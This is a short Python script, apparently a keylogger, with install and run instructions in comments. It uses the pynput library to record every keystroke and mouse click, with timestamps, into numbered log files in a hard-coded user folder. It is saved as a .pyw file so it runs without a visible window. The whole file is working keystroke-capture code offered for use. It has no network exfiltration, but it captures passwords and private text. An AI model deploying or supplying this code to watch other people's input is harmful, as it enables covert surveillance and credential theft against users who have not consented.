#use command to install pynput: python-m pip install pynput
#create a folder on your computer, and change log_dir directory to your folder directory
#run keylogger.pyw

from pynput import mouse, keyboard
#from pynput.mouse import mouse.Listener
import logging
import os

def generateFileName(folder):
    if len(os.listdir(log_dir))==0:
        return "key_log1.txt"
    else:
        highest_num =0;
        for f in os.listdir(folder):
            file_name = os.path.basename(f)
            file_num = int((os.path.splitext(file_name)[0].split('key_log'))[1])
            if file_num > highest_num:
                highest_num = file_num
        output_filename = "key_log" + str(highest_num +1) +".txt"
        return output_filename


def on_press(key):
    logging.info(str(key))

def on_click(x, y, button, pressed):
    if pressed:
        logging.info("Mouse clicked at ({0}, {1}) with {2}".format(x, y, button))


if __name__ == "__main__":

     #change the directory to your log folder on your computer
     #replace \ with /
    log_dir = "C:/Users/yingy/Desktop/logs/"
    output_file_name = generateFileName(log_dir)
    logging.basicConfig(filename=log_dir + output_file_name, level=logging.DEBUG, format='%(asctime)s:   %(message)s')
    with keyboard.Listener(on_press=on_press) as listener:
        with mouse.Listener(on_click=on_click) as listener:
            listener.join()
